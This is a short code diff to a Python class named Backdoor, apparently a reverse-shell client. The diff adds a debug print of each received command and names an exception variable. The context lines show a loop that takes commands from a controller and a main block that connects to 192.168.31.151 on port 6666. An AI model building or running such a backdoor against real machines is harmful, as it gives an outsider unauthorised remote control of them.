@@ -90,6 +90,7 @@ class Backdoor:
     def run(self):
         while True:
             command = self.receive_data()
+            print(f'command: {command}')
             data = None
 
             try:
@@ -142,5 +143,5 @@ if __name__ == '__main__':
     try:
         process = Backdoor('192.168.31.151', 6666)
         process.run()
-    except Exception:
+    except Exception as exc:
         sys.exit()
